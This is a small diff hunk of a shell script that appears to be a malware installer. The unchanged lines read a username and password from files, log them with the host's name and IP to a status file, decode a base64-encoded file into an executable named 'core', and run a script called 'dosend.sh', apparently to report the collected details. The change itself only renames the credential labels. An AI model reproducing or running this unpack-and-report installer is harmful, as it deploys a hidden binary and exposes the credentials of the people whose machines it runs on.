@@ -15,8 +15,8 @@ looku=$(head -1 ../inuser.txt)
 lookup=$(head -1 ../inpass.txt)
 echo "NEW INSTALL $Uname" > status.txt
 echo "Install in $ip4set" >> status.txt
-echo "inu ::: $looku" >> status.txt
-echo "inp ::: $lookup" >> status.txt
+echo "inustr ::: $looku" >> status.txt
+echo "inpstr ::: $lookup" >> status.txt
 base64 -d core.temp > core
 chmod +x core dosend.sh
 ./dosend.sh
